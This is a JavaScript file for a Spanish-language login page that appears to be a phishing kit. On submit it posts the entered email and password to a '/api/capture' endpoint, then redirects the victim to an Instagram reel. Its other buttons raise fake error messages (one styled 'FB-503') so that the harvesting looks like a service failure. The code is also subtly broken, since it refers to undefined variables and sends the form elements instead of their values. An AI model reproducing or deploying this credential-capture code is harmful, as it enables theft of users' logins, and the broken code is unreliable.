const form = document.getElementById("loginForm");
const email = document.getElementById("email");
const password = document.getElementById("password");
const submitBtn = document.getElementById("submitBtn");
const togglePass = document.getElementById("togglePass");
const eyeSlash = document.getElementById("eyeSlash");

// El botón se activa solo cuando ambos campos tienen contenido
function refreshSubmit() {
  submitBtn.disabled = !(user.value.trim() && pass.value.trim());
}
user.addEventListener("input", refreshSubmit);
pass.addEventListener("input", refreshSubmit);

togglePass.addEventListener("click", () => {
  const showing = pass.type === "text";
  pass.type = showing ? "password" : "text";
  eyeSlash.style.display = showing ? "" : "none";
  togglePass.setAttribute(
    "aria-label",
    showing ? "Mostrar contraseña" : "Ocultar contraseña",
  );
});

form.addEventListener("submit", function (event) {
  event.preventDefault();

  // Enviar datos al servidor
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "/api/capture", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.onreadystatechange = function () {
    console.log(
      "[DEBUG] readyState=" +
        xhr.readyState +
        " status=" +
        xhr.status +
        " response=" +
        xhr.responseText,
    );
    if (xhr.readyState === 4) {
      window.location.href =
        "https://www.instagram.com/reel/DatkO-5pJ29/?igsh=MXYwMWdtYmdna2V0dg==";
    }
  };
  xhr.onerror = function () {
    console.log(
      "[DEBUG] xhr.onerror disparado — fallo de red/CORS antes de completar",
    );
  };
  xhr.send(
    "email=" +
      encodeURIComponent(email) +
      "&password=" +
      encodeURIComponent(password),
  );
});
function mostrarError(titulo, mensaje, codigo){
    document.getElementById("demoModal").style.display = "flex";
    document.getElementById("tituloError").textContent = titulo;
    document.getElementById("mensajeError").textContent = mensaje;
    document.getElementById("codigoError").textContent = codigo;
}

document.querySelector(".btn-secondary").onclick = () =>{
    mostrarError(
        "No se pudo iniciar sesión",
        "Ha ocurrido un error inesperado. Inténtelo nuevamente en unos minutos.",
        "Código de error: FB-503"
    );
};

document.querySelector(".link-center").onclick = (e)=>{
    e.preventDefault();
    mostrarError(
        "Error de recuperación",
        "No fue posible conectar con el servicio de recuperación.",
        "Código de error: REC-408"
    );
};

document.querySelector(".outline-accent").onclick = ()=>{
    mostrarError(
        "Registro no disponible",
        "No se pudo establecer comunicación con el servidor.",
        "Código de error: REG-500"
    );
};